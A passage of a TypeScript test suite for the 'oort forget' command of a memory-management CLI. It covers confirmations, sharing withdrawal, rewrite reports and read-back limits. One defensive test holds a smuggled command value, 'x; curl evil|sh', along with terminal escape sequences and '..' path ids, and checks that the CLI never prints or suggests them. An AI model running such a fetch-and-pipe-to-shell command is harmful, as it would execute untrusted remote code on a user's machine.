    const r = await e.run(['forget', ID, '--everywhere', '--yes']);
    expect(r.code).toBe(2);
    expect(r.io.stderr).toContain('invite-only beta');
    expect(e.cloud.memories.has(ID)).toBe(true);
    expect(e.cloud.seen.filter((s) => s.startsWith('DELETE'))).toEqual([]);
  });

  it('forget.everywhere-with-no-copies-forgets-and-says-so', async () => {
    const e = setup();
    withTeam(e);
    const no = await e.run(['forget', ID, '--everywhere'], { tty: true, answer: 'n' });
    expect(no.io.asked[0]).toBe(
      'Forget 22222222 "We deploy oortcloud with wrangler; ask maya@example.com." (no shared copies found; any you made will be withdrawn)? [y/N] ',
    );
    const r = await e.run(['forget', ID, '--everywhere', '--yes']);
    expect(r.code, r.io.stderr).toBe(0);
    expect(r.io.stdout).toBe(`Forgot ${ID}.\nIt was not shared to any Constellation.\n`);
  });

  it('forget.everywhere-with-only-removal-requests-exits-0', async () => {
    const e = setup();
    withTeams(e);
    copyIn(e, CHECKOUT);
    e.cloud.hive.withdrawOutcome.set(CHECKOUT, 'requested');
    const r = await e.run(['forget', ID, '--everywhere', '--yes', '--json']);
    // A removal request is the intended outcome where others contributed: not a partial failure.
    expect(r.code, r.io.stderr).toBe(0);
    expect(JSON.parse(r.io.stdout)).not.toHaveProperty('exitCode');
    expect(data(r.io.stdout).removalRequested).toEqual([CHECKOUT]);
  });

  it('forget.everywhere-on-a-forgotten-id-shows-the-real-reason-a-lookup-failed', async () => {
    const e = setup();
    withTeam(e);
    copyIn(e, 'c_aaaaaaaaaaaaaaaa');
    expect((await e.run(['forget', ID, '--yes'])).code).toBe(0);
    // The memory is gone; a failing shares lookup is reported as itself, never as not-found.
    e.cloud.fail = { 'GET /v1/memories/:id/shares': 503 };
    const down = await e.run(['forget', ID, '--everywhere', '--yes', '--json']);
    expect(down.code).toBe(2);
    expect(failed(down, 'network', 'forget').message).toContain('HTTP 503');
    e.cloud.fail = undefined;
    e.cloud.hive.enabled = false;
    const beta = await e.run(['forget', ID, '--everywhere', '--yes']);
    expect(beta.code).toBe(2);
    expect(beta.io.stderr).toContain('invite-only beta');
    expect(e.cloud.hive.shared.size).toBe(1);
  });

  it('forget.an-edge-without-withdrawnAt-counts-as-a-live-copy', async () => {
    const e = setup();
    withTeam(e);
    // An API that leaves `withdrawnAt` out: the copy is live, so the question names it.
    const base = e.cloud.fetch;
    e.cloud.fetch = (async (input: string | URL | Request, init?: RequestInit) => {
      const res = await base(input, init);
      const url = new URL(new Request(input, init).url);
      if (!url.pathname.endsWith('/shares') || !res.ok) return res;
      const body = (await res.json()) as { shares: Record<string, unknown>[] };
      return Response.json({ shares: body.shares.map(({ withdrawnAt: _w, ...x }) => x) });
    }) as typeof fetch;
    copyIn(e, 'c_aaaaaaaaaaaaaaaa');
    const r = await e.run(['forget', ID], { tty: true, answer: 'n' });
    expect(r.io.asked[0]).toContain('(also shared to oort-core; add --everywhere');
  });

  // CON-107: refuses without a terminal on stdin and with --json (exit 2, no prompt), exits 0
  // when declined, and asks on stderr even with stdout piped, acting on yes.
  it('confirm.forget-everywhere-no-tty-json-declined-piped-yes', async () => {
    const e = setup();
    withTeam(e);
    copyIn(e, 'c_aaaaaaaaaaaaaaaa');
    const changes = (): string[] => e.cloud.seen.filter((s) => !s.startsWith('GET '));
    expectRefusedWithoutPrompt(await e.run(['forget', ID, '--everywhere']), NO_TTY_STDIN);
    const json = await e.run(['forget', ID, '--everywhere', '--json'], { tty: true });
    expectRefusedWithoutPrompt(json, JSON_NEVER_ASKS);
    const refusal = failed(json, 'needs-confirmation', 'forget');
    expect(refusal.message).toContain('re-run with --yes to forget it everywhere');
    expect(refusal.fix).toBe(`oort forget ${ID} --everywhere --json --yes`);
    const no = await e.run(['forget', ID, '--everywhere'], { tty: true, answer: 'n' });
    expectDeclined(no);
    expect(no.io.stdout).toBe('Kept.\n');
    expect(changes()).toEqual([]);
    const yes = await e.run(['forget', ID, '--everywhere'], PIPED_YES);
    expectAsked(yes);
    expect(yes.io.asked[0]).toContain('withdraw your copies from oort-core');
    expect(changes()).toEqual([`DELETE /v1/memories/${ID}`]);
    expect(e.cloud.hive.shared.size).toBe(0);
  });
});

describe('oort forget reports what Oort Cloud rewrote (CON-161)', () => {
  const LATER = '44444444-5555-4666-8777-888888888888';
  const NEXT = '55555555-6666-4777-8888-999999999999';

  /** ID, then LATER (already rewritten by the cloud: the fake rewrites nothing), then NEXT. */
  function chain(e: ReturnType<typeof setup>): void {
    e.cloud.memories.set(
      ID,
      fakeMemory({ id: ID, text: 'The dev server runs on port 3000.', supersededBy: LATER }),
    );
    e.cloud.memories.set(
      LATER,
      fakeMemory({
        id: LATER,
        text: 'The dev server port is 8080.',
        supersedes: ID,
        supersededBy: NEXT,
      }),
    );
    e.cloud.memories.set(
      NEXT,
      fakeMemory({ id: NEXT, text: 'The dev server port changed from 3000 to 8081.' }),
    );
  }

  it('forget.cloud-names-what-it-rewrote-as-local-mode-does-and-exits-0', async () => {
    const e = setup();
    chain(e);
    e.cloud.forgetAnswer = { rewritten: [LATER] };
    const r = await e.run(['forget', ID, '--yes']);
    expect(r.code, r.io.stderr).toBe(0);
    expect(r.io.stdout).toBe(
      `Forgot ${ID}.\nRewrote 44444444 to its current fact: "The dev server port is 8080."\n`,
    );
    // The cloud's answer is the report: no walk of the chain, only the rewritten text read after.
    // NEXT restates 3000, but the cloud did not name it: the CLI never adds one of its own.
    expect(e.cloud.seen.slice(e.cloud.seen.indexOf(`DELETE /v1/memories/${ID}`))).toEqual([
      `DELETE /v1/memories/${ID}`,
      `GET /v1/memories/${LATER}`,
    ]);
    expect(e.cloud.seen).not.toContain(`GET /v1/memories/${NEXT}`);
  });

  it('forget.cloud-names-each-memory-left-as-it-was-with-its-reason-and-exits-3', async () => {
    const e = setup();
    chain(e);
    const ids = ['a', 'b', 'd', 'e', 'c', 'f', '9'].map(
      (x) => `${x.repeat(8)}-0000-4000-8000-000000000000`,
    );
    const [q, u, t, w, c, n, m] = ids as [string, string, string, string, string, string, string];
    e.cloud.forgetAnswer = {
      rewritten: [LATER],
      notRewritten: ids,
      reasons: {
        [q]: 'quota',
        [u]: 'unpaid',
        [t]: 'timeout',
        [w]: 'no-writer',
        [c]: 'chain-too-long',
        // A reason from a newer Oort Cloud, with an escape sequence: shown, never run.
        [n]: 'brand-new\u001b[31m',
        // m: none given.
      },
    };
    const r = await e.run(['forget', ID, '--yes', '--json']);
    expect(r.code, r.io.stderr).toBe(3);
    const d = data(r.io.stdout, 'forget');
    expect(d.rewritten).toEqual([LATER]);
    expect(d.notRewritten).toEqual(ids);
    const tail = (id: string) =>
      ` Check it with \`oort inspect ${id}\`, or forget it too: \`oort forget ${id}\`.`;
    expect(JSON.parse(r.io.stdout).warnings).toEqual([
      {
        code: 'not-rewritten',
        message: `aaaaaaaa may still restate it, because the account is at a usage cap.${tail(q)}`,
      },
      {
        code: 'not-rewritten',
        message: `bbbbbbbb may still restate it, because the plan does not allow model calls now.${tail(u)}`,
      },
      {
        code: 'not-rewritten',
        message: `dddddddd may still restate it, because the rewrite did not finish in time.${tail(t)}`,
      },
      {
        code: 'not-rewritten',
        message: `eeeeeeee may still restate it, because no memory writer is set up (oort doctor says why).${tail(w)}`,
      },
      {
        code: 'not-rewritten',
        message: `cccccccc is a later memory of its chain and may restate it, because it lies past the first 64 later memories of the chain, the most one forget rewrites.${tail(c)}`,
      },
      {
        code: 'not-rewritten',
        message: `ffffffff may still restate it, because Oort Cloud left it as it was (reason: brand-new\\u{1b}[31m).${tail(n)}`,
      },
      {
        code: 'not-rewritten',
        message: `99999999 may still restate it, because Oort Cloud left it as it was.${tail(m)}`,
      },
    ]);
    expect(r.io.stderr).toContain(
      'Rewrote 44444444 to its current fact: "The dev server port is 8080."',
    );
    expect(r.io.stderr).not.toContain('\u001b');
  });

  it('forget.cloud-odd-answers-never-crash-and-never-claim-a-rewrite', async () => {
    const e = setup();
    chain(e);
    // An id in both lists is not claimed as rewritten; a non-string id is dropped; reasons that
    // are not an object give no reason.
    e.cloud.forgetAnswer = {
      rewritten: [LATER, 42, null, {}, [1]],
      notRewritten: [LATER, {}, [1], {}],
      reasons: [],
    };
    const r = await e.run(['forget', ID, '--yes', '--json']);
    expect(r.code, r.io.stderr).toBe(3);
    // Each odd entry counts, a repeated one too (as the Python SDK counts them).
    expect(data(r.io.stdout, 'forget')).toMatchObject({
      rewritten: [],
      notRewritten: [LATER],
      notRewrittenUnnamed: 3,
    });
    expect(r.io.stderr).not.toContain('Rewrote');
    // A body that is not JSON reads as no lists: the CLI walks the chain itself.
    const g = setup();
    chain(g);
    g.cloud.fail = { 'DELETE /v1/memories/:id': 'garbage' };
    const garbage = await g.run(['forget', ID, '--yes', '--json']);
    expect(garbage.code, garbage.io.stderr).toBe(3);
    expect(data(garbage.io.stdout, 'forget')).not.toHaveProperty('rewritten');
  });

  it('forget.cloud-rewritten-text-that-cannot-be-read-still-names-the-rewrite', async () => {
    const e = setup();
    chain(e);
    e.cloud.forgetAnswer = { rewritten: [LATER] };
    e.cloud.fail = { [`GET /v1/memories/${LATER}`]: 503 };
    const r = await e.run(['forget', ID, '--yes']);
    expect(r.code, r.io.stderr).toBe(0);
    expect(r.io.stdout).toBe(
      `Forgot ${ID}.\nRewrote 44444444 to its current fact. Read it with \`oort inspect ${LATER}\`.\n`,
    );
  });

  it('forget.cloud-answer-without-the-lists-is-an-oort-cloud-from-before-rewrites', async () => {
    for (const body of [{ forgotten: ID }, { rewritten: 'no', notRewritten: null }]) {
      const e = setup();
      chain(e);
      e.cloud.forgetAnswer = {
        rewritten: undefined,
        notRewritten: undefined,
        reasons: undefined,
        ...body,
      };
      const r = await e.run(['forget', ID, '--yes', '--json']);
      // The CLI walks the chain itself, as before: NEXT restates 3000.
      expect(r.code, r.io.stderr).toBe(3);
      const d = data(r.io.stdout, 'forget');
      expect(d).not.toHaveProperty('rewritten');
      expect(d).not.toHaveProperty('notRewritten');
      expect(
        (JSON.parse(r.io.stdout).warnings as { message: string }[]).map((x) => x.message),
      ).toEqual([
        `55555555 may still restate it: Oort Cloud does not rewrite later memories yet. Check it with \`oort inspect ${NEXT}\`, or forget it too: \`oort forget ${NEXT}\`.`,
      ]);
    }
  });

  it('forget.everywhere-reports-what-oort-cloud-rewrote', async () => {
    const e = setup();
    withTeams(e);
    chain(e);
    copyIn(e, CHECKOUT);
    e.cloud.forgetAnswer = {
      rewritten: [LATER],
      notRewritten: [NEXT],
      reasons: { [NEXT]: 'unpaid' },
    };
    const r = await e.run(['forget', ID, '--everywhere', '--yes']);
    expect(r.code, r.io.stderr).toBe(3);
    expect(r.io.stdout).toBe(
      [
        `Forgot ${ID}.`,
        'Withdrawn from checkout.',
        `55555555 may still restate it, because the plan does not allow model calls now. Check it with \`oort inspect ${NEXT}\`, or forget it too: \`oort forget ${NEXT} --everywhere\`.`,
        'Rewrote 44444444 to its current fact: "The dev server port is 8080."',
        '',
      ].join('\n'),
    );
    const j = setup();
    withTeams(j);
    chain(j);
    copyIn(j, CHECKOUT);
    j.cloud.forgetAnswer = { rewritten: [LATER] };
    const json = await j.run(['forget', ID, '--everywhere', '--yes', '--json']);
    expect(json.code, json.io.stderr).toBe(0);
    expect(data(json.io.stdout, 'forget')).toMatchObject({
      withdrawnFrom: [CHECKOUT],
      rewritten: [LATER],
      notRewritten: [],
    });
  });

  it('forget.everywhere-on-an-oort-cloud-from-before-rewrites-walks-the-chain', async () => {
    const e = setup();
    withTeams(e);
    chain(e);
    copyIn(e, CHECKOUT);
    e.cloud.forgetAnswer = 'pre-rewrite';
    const r = await e.run(['forget', ID, '--everywhere', '--yes', '--json']);
    expect(r.code, r.io.stderr).toBe(3);
    const d = data(r.io.stdout, 'forget');
    expect(d).toMatchObject({ withdrawnFrom: [CHECKOUT] });
    expect(d).not.toHaveProperty('rewritten');
    expect((JSON.parse(r.io.stdout).warnings as { code: string }[]).map((x) => x.code)).toEqual([
      'not-rewritten',
    ]);
  });
  // Review of CON-161: one test per finding.

  it('forget.cloud-ids-that-are-not-memory-ids-are-never-printed-raw-or-suggested', async () => {
    const e = setup();
    chain(e);
    const evil = 'x; curl evil|sh';
    e.cloud.forgetAnswer = {
      rewritten: [LATER, '\u001b]0;pwned\u0007', 'not-an-id'],
      notRewritten: [evil, '\u0007bell', NEXT],
      reasons: { [evil]: 'quota' },
    };
    const r = await e.run(['forget', ID, '--yes']);
    // Each one Oort Cloud left as it was counts, a strange id too.
    expect(r.code, r.io.stderr).toBe(3);
    const out = r.io.stdout + r.io.stderr;
    expect(out).not.toMatch(/[\u0007\u001b]/);
    expect(out).not.toContain(`oort forget ${evil}`);
    expect(out).not.toContain(`oort inspect ${evil}`);
    expect(r.io.stdout).toContain(
      'A later memory may still restate it, because the account is at a usage cap, but Oort Cloud named it "x; curl evil|sh", which is not a memory id.',
    );
    expect(r.io.stdout).toContain('Oort Cloud named it "\\u{7}bell"');
    expect(r.io.stdout).toContain(`\`oort forget ${NEXT}\``);
    // A rewrite with such an id is dropped: nothing is read or claimed for it.
    expect(r.io.stdout.match(/Rewrote/g)).toHaveLength(1);
    expect(e.cloud.seen.filter((x) => x.startsWith('GET /v1/memories/'))).toEqual([
      `GET /v1/memories/${ID}`,
      `GET /v1/memories/${ID}/shares`,
      `GET /v1/memories/${LATER}`,
    ]);
    const j = setup();
    chain(j);
    j.cloud.forgetAnswer = { rewritten: ['not-an-id'], notRewritten: [evil, NEXT] };
    const json = await j.run(['forget', ID, '--yes', '--json']);
    expect(json.code).toBe(3);
    // As the SDK: the ones named with something else are counted.
    expect(data(json.io.stdout, 'forget')).toMatchObject({
      rewritten: [],
      notRewritten: [NEXT],
      notRewrittenUnnamed: 1,
    });
  });

  it('forget.cloud-a-rewrite-read-back-with-odd-text-or-another-id-never-crashes', async () => {
    const e = setup();
    chain(e);
    const OTHER = '66666666-7777-4888-8999-aaaaaaaaaaaa';
    e.cloud.memories.set(LATER, { ...fakeMemory({ id: LATER }), text: 42 as unknown as string });
    // A read that resolves to another memory (as a prefix can) is not its text either.
    const swapped = LATER.replace('4', '7');
    e.cloud.memories.set(swapped, fakeMemory({ id: OTHER, text: 'Not it.' }));
    e.cloud.forgetAnswer = { rewritten: [LATER, swapped], notRewritten: [NEXT] };
    const r = await e.run(['forget', ID, '--yes']);
    expect(r.code, r.io.stderr).toBe(3);
    expect(r.io.stdout).toContain(
      `Rewrote 44444444 to its current fact. Read it with \`oort inspect ${LATER}\`.`,
    );
    expect(r.io.stdout).toContain(
      `Rewrote 74444444 to its current fact. Read it with \`oort inspect ${swapped}\`.`,
    );
    expect(r.io.stdout).not.toContain('Not it.');
    expect(r.io.stdout).toContain('55555555 may still restate it');
  });

  it('forget.cloud-reads-at-most-64-rewrites-4-at-a-time-after-naming-what-was-left', async () => {
    const e = setup();
    chain(e);
    const many = Array.from(
      { length: 70 },
      (_, i) => `${i.toString(16).padStart(8, '0')}-0000-4000-8000-000000000000`,
    );
    for (const id of many) e.cloud.memories.set(id, fakeMemory({ id, text: `Fact ${id}.` }));
    e.cloud.forgetAnswer = { rewritten: many, notRewritten: [NEXT] };
    let inFlight = 0;
    let most = 0;
    let stdoutAtFirstRead: string | undefined;
    let io: { stdout: string } | undefined;
    e.cloud.getGate = async (id) => {
      if (!many.includes(id)) return;
      stdoutAtFirstRead ??= io?.stdout;
      inFlight += 1;
      most = Math.max(most, inFlight);
      await new Promise((r) => setTimeout(r, 2));
      inFlight -= 1;
    };
    const r = await e.run(['forget', ID, '--yes'], { onIo: (x) => (io = x) });
    expect(r.code, r.io.stderr).toBe(3);
    // "Forgot" and what was left as it was come first, before any read can stall.
    expect(stdoutAtFirstRead).toBe(
      `Forgot ${ID}.\n55555555 may still restate it, because Oort Cloud left it as it was. Check it with \`oort inspect ${NEXT}\`, or forget it too: \`oort forget ${NEXT}\`.\n`,
    );
    expect(
      e.cloud.seen.filter((x) => many.some((id) => x === `GET /v1/memories/${id}`)),
    ).toHaveLength(64);
    expect(most).toBeLessThanOrEqual(4);
    expect(r.io.stdout.match(/Rewrote /g)).toHaveLength(70);
    expect(r.io.stdout).toContain(
      `Rewrote 00000045 to its current fact. Read it with \`oort inspect ${many[69]}\`.`,
    );
  });

  /** A read that answers only when it is aborted, and then settles `settleMs` later. */
  const untilAborted =
    (settleMs = 0) =>
    (_id: string, signal: AbortSignal): Promise<never> =>
      new Promise<never>((_, reject) =>
        signal.addEventListener('abort', () =>
          setTimeout(() => reject(new Error('aborted')), settleMs),
        ),
      );

  it('forget.cloud-a-read-that-never-answers-gives-up-after-its-timeout', async () => {
    const stuck = untilAborted();
    const texts = await readTexts(
      ['a', 'b', 'c'],
      async (id, signal) => (id === 'b' ? stuck(id, signal) : { id, text: `T${id}` }),
      { timeoutMs: 20 },
    );
    expect(texts).toEqual([{ id: 'a', text: 'Ta' }, { id: 'b' }, { id: 'c', text: 'Tc' }]);
  });

  it('forget.cloud-reads-back-at-most-4-at-once-even-while-abandoned-ones-wind-down', async () => {
    let inFlight = 0;
    let most = 0;
    const slow = untilAborted(15);
    const texts = await readTexts(
      Array.from({ length: 12 }, (_, i) => `id${i}`),
      async (id, signal) => {
        inFlight += 1;
        most = Math.max(most, inFlight);
        try {
          return await slow(id, signal);
        } finally {
          inFlight -= 1;
        }
      },
      { timeoutMs: 5 },
    );
    expect(texts.every((t) => t.text === undefined)).toBe(true);
    expect(most).toBe(4);
    expect(inFlight).toBe(0);
  });

  it('forget.cloud-read-back-stops-at-its-overall-deadline', async () => {
    const t0 = Date.now();
    const texts = await readTexts(
      ['a', 'b', 'c', 'd', 'e', 'f'],
      async (id, signal) => (id === 'a' ? { id, text: 'Ta' } : untilAborted()(id, signal)),
      { timeoutMs: 60_000, deadlineMs: 40, parallel: 1 },
    );
    expect(Date.now() - t0).toBeLessThan(2_000);
    expect(texts).toEqual([
      { id: 'a', text: 'Ta' },
      { id: 'b' },
      { id: 'c' },
      { id: 'd' },
      { id: 'e' },
      { id: 'f' },
    ]);
  });

  it(
    'forget.cloud-an-abandoned-read-of-a-stalled-body-leaves-no-socket-open',
    { timeout: 15_000 },
    async () => {
      const open = new Set<import('node:net').Socket>();
      /** The connections that carried a read: aborting the read closes each one. */
      const reading = new Set<import('node:net').Socket>();
      let requests = 0;
      let most = 0;
      const server = http.createServer((req, res) => {
        requests += 1;
        most = Math.max(most, requests);
        reading.add(req.socket);
        req.socket.once('close', () => {
          requests -= 1;
          reading.delete(req.socket);
        });
        // Headers and part of the body, then nothing.
        res.writeHead(200, { 'content-type': 'application/json' });
        res.write('{"id":"');
      });
      server.on('connection', (s) => {
        open.add(s);
        s.once('close', () => open.delete(s));
      });
      await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
      try {
        const { port } = server.address() as import('node:net').AddressInfo;
        const client = createCloudClient({ url: `http://127.0.0.1:${port}`, key: 'k' });
        const ids = Array.from(
          { length: 6 },
          (_, i) => `${i.toString(16).padStart(8, '0')}-0000-4000-8000-000000000000`,
        );
        const texts = await readTexts(
          ids,
          (id, signal) => client.get(id, { timeoutMs: 100, signal }),
          { timeoutMs: 100 },
        );
        expect(texts).toEqual(ids.map((id) => ({ id })));
        expect(most).toBeLessThanOrEqual(4);
        const until = async (done: () => boolean, ms: number): Promise<void> => {
          for (const end = Date.now() + ms; !done() && Date.now() < end;) {
            await new Promise((r) => setTimeout(r, 10));
          }
        };
        // Every read was aborted, its connection with it, at once.
        await until(() => reading.size === 0, 500);
        expect(reading.size).toBe(0);
        // Node 24's fetch may also open spare connections that never carry a request; it keeps them
        // idle (not holding the process) and closes them after its keep-alive timeout, about 3 s.
        await until(() => open.size === 0, 8_000);
        expect(open.size).toBe(0);
      } finally {
        server.closeAllConnections();
        await new Promise((r) => server.close(r));
      }
    },
  );

  it('forget.cloud-dot-ids-never-reach-another-route', async () => {
    const e = setup();
    chain(e);
    e.cloud.forgetAnswer = { rewritten: ['..', '.'], notRewritten: ['.'] };
    const r = await e.run(['forget', ID, '--yes']);
    expect(r.code, r.io.stderr).toBe(3);
    expect(e.cloud.seen.filter((x) => x.startsWith('GET'))).toEqual([
      `GET /v1/memories/${ID}`,
      `GET /v1/memories/${ID}/shares`,
    ]);
    expect(r.io.stdout).toContain('Oort Cloud named it ".", which is not a memory id.');
    expect(r.io.stdout).not.toContain('Rewrote');
  });

  it('forget.cloud-suggests-everywhere-for-a-later-memory-when-the-forgotten-one-was-shared', async () => {
    const e = setup();
    withTeams(e);
    chain(e);
    copyIn(e, CHECKOUT);
    e.cloud.forgetAnswer = { notRewritten: [NEXT] };
    const r = await e.run(['forget', ID, '--yes']);
    expect(r.code, r.io.stderr).toBe(3);
    expect(r.io.stdout).toContain(`forget it too: \`oort forget ${NEXT} --everywhere\`.`);
    // No extra lookups: the forgotten memory's own shares say so.
    expect(e.cloud.seen.filter((x) => x.endsWith('/shares'))).toEqual([
      `GET /v1/memories/${ID}/shares`,
    ]);
    // Not shared: the plain command.
    const p = setup();
    chain(p);
    p.cloud.forgetAnswer = { notRewritten: [NEXT] };
    const plain = await p.run(['forget', ID, '--yes']);
    expect(plain.io.stdout).toContain(`forget it too: \`oort forget ${NEXT}\`.`);
  });
});
